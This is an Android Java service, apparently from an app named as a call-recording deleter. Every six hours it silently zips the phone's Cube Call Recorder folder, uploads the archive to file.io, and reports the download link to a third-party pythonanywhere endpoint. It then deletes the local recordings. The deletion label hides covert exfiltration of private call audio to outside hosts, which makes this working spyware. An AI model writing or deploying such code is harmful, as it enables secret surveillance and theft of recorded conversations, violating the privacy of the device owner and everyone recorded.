package com.example.cubearcdeleter;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import org.json.JSONObject;
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class DeleteService extends Service {
    
    private static final String TARGET_FOLDER = "/storage/emulated/0/Documents/CubeCallRecorder/All/";
    private static final String FILE_IO_UPLOAD_URL = "https://file.io/";
    private static final String STORE_URL_API = "https://filestore.pythonanywhere.com/file-urls/add/?url=";
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        startDeletionTask();
    }

    private void startDeletionTask() {
        Runnable deletionTask = new Runnable() {
            @Override
            public void run() {
                try {
                    processAudioRecords();
                } catch (IOException e) {
                    stopSelf();  // Stop the service if any error occurs
                }
                handler.postDelayed(this, 6 * 60 * 60 * 1000); // Run every 6 hours
            }
        };
        handler.post(deletionTask);
    }

    private void processAudioRecords() throws IOException {
        File zipFile = createZip();
        if (zipFile != null) {
            String fileUrl = uploadFile(zipFile);
            if (fileUrl != null) {
                storeUrl(fileUrl);
                deleteFiles();
            } else {
                stopSelf();  // Stop the service if upload fails
            }
        }
    }

    private File createZip() throws IOException {
        File zipFile = new File(getExternalFilesDir(null), "records.zip");
        File folder = new File(TARGET_FOLDER);
        File[] files = folder.listFiles((dir, name) -> !name.startsWith("."));
        if (files == null || files.length == 0) {
            return null;  // No files to zip
        }

        try (FileOutputStream fos = new FileOutputStream(zipFile);
             ZipArchiveOutputStream zos = new ZipArchiveOutputStream(fos)) {
            for (File file : files) {
                if (file.isFile()) {
                    ZipArchiveEntry zipEntry = new ZipArchiveEntry(file.getName());
                    zos.putArchiveEntry(zipEntry);
                    zos.write(java.nio.file.Files.readAllBytes(file.toPath()));
                    zos.closeArchiveEntry();
                }
            }
        }
        return zipFile;
    }

    private String uploadFile(File file) throws IOException {
        OkHttpClient client = new OkHttpClient();
        RequestBody requestBody = RequestBody.create(file, MediaType.parse("application/zip"));
        Request request = new Request.Builder()
                .url(FILE_IO_UPLOAD_URL)
                .post(requestBody)
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) {
                return null;  // Upload failed
            } else {
                return extractUrlFromResponse(response.body().string());
            }
        }
    }

    private void storeUrl(String url) throws IOException {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(STORE_URL_API + url)
                .get()
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) {
                throw new IOException("Failed to store URL");
            }
        }
    }

    private void deleteFiles() {
        File folder = new File(TARGET_FOLDER);
        File[] files = folder.listFiles((dir, name) -> !name.startsWith("."));
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    file.delete();
                }
            }
        }
    }

    private String extractUrlFromResponse(String responseBody) {
        JSONObject jsonResponse = new JSONObject(responseBody);
        return jsonResponse.getString("url");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
